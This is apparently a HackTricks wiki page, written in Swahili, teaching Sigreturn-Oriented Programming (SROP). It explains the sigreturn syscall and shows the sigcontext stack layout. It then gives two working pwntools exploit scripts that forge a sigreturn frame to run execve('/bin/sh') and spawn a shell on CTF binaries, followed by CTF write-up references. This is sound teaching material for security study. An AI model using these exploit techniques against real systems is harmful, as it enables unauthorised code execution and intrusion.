# SROP - Programu ya Sigreturn-Oriented

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**`Sigreturn`** ni **syscall** maalum ambayo kimsingi hutumiwa kusafisha baada ya kikamataji cha ishara kumaliza utekelezaji wake. Ishara ni mapumziko yanayotumwa kwa programu na mfumo wa uendeshaji, mara nyingi kumaanisha kuwa hali isiyo ya kawaida imejitokeza. Wakati programu inapokea ishara, kwa muda inasitisha kazi yake ya sasa kushughulikia ishara na **kikamataji cha ishara**, kazi maalum iliyoundwa kushughulikia ishara.

Baada ya kikamataji cha ishara kukamilisha, programu inahitaji **kuendelea na hali yake ya awali** kana kwamba hakuna kilichotokea. Hapa ndipo **`sigreturn`** inapoingia. Inasaidia programu **kurudi kutoka kwa kikamataji cha ishara** na kurejesha hali ya programu kwa kusafisha fremu ya steki (sehemu ya kumbukumbu inayohifadhi wito wa kazi na pembejeo za ndani) ambayo ilitumiwa na kikamataji cha ishara.

Sehemu inayovutia ni jinsi **`sigreturn`** inavyorejesha hali ya programu: inafanya hivyo kwa kuhifadhi **thamani zote za rejista za CPU** kwenye steki. Ishara haizuiwi tena, **`sigreturn` inapitisha thamani hizi kutoka kwenye steki**, ikirejesha kwa ufanisi rejista za CPU kwenye hali yake kabla ya ishara kushughulikiwa. Hii ni pamoja na rejista ya kidole cha steki (RSP), ambayo inaelekeza kwenye sehemu ya juu ya sasa ya steki.

{% hint style="danger" %}
Kuita syscall **`sigreturn`** kutoka kwa mnyororo wa ROP na **kuongeza thamani za rejista** tungependa iweze kuiweka kwenye **steki** inawezekana **kudhibiti** thamani zote za rejista na hivyo **kuita** kwa mfano syscall `execve` na `/bin/sh`.
{% endhint %}

Tafadhali angalia jinsi hii itakuwa **aina ya Ret2syscall** ambayo inafanya iwe rahisi kudhibiti vigezo vya kuita Ret2syscalls nyingine:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Ikiwa una hamu hii ni **muundo wa sigcontext** uliohifadhiwa kwenye steki kwa kupona thamani baadaye (mtaalam kutoka [**hapa**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Kwa maelezo bora angalia pia:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Mfano

Unaweza [**kupata mfano hapa**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) ambapo wito wa signeturn unajengwa kupitia ROP (ukitia thamani `0xf` kwa rxa), ingawa hii ni shambulizi la mwisho kutoka hapo:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Angalia pia [**exploit kutoka hapa**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) ambapo binary ilikuwa tayari inaita `sigreturn` na kwa hivyo haifai kujenga hiyo na **ROP**:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Mifano na Marejeo Mengine

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Programu ya ushirikiano wa kisasa inayoruhusu **kuandika kwenye steki** na kisha kuita **syscall ya `sigreturn`**. Inawezekana kuandika kwenye steki [**ret2syscall**](rop-syscall-execv.md) kupitia muundo wa **sigreturn** na kusoma bendera ambayo iko ndani ya kumbukumbu ya programu ya ushirikiano.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Programu ya ushirikiano wa kisasa inayoruhusu **kuandika kwenye steki** na kisha kuita **syscall ya `sigreturn`**. Inawezekana kuandika kwenye steki [**ret2syscall**](rop-syscall-execv.md) kupitia muundo wa **sigreturn** (programu ya ushirikiano ina string `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* Biti 64, hakuna relro, hakuna canary, nx, hakuna pie. Uvujaji rahisi wa steki unaoabuse kazi ya `gets` bila vifaa vya kutekeleza [**ret2syscall**](rop-syscall-execv.md). Mnyororo wa ROP unaandika `/bin/sh` katika `.bss` kwa kuita tena gets, unatumia kazi ya **`alarm`** kuweka eax kuwa `0xf` ili kuita **SROP** na kutekeleza kikao.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* Programu ya biti 64, hakuna relro, hakuna canary, nx, hakuna pie. Mchakato unaruhusu kuandika kwenye steki, kudhibiti vijenzi kadhaa, na kuita syscall na kisha kuita `exit`. Syscall iliyochaguliwa ni `sigreturn` ambayo itaweka vijenzi na kuhamisha `eip` kuita maagizo ya syscall ya awali na kutekeleza `memprotect` kuweka nafasi ya programu kuwa `rwx` na kuweka ESP katika nafasi ya programu. Kufuata mchakato, programu itaita kusoma kwenye ESP tena, lakini katika kesi hii ESP itakuwa inaelekeza kwa maagizo yanayofuata hivyo kupitisha shellcode itaandika kama maagizo yanayofuata na kuyatekeleza.
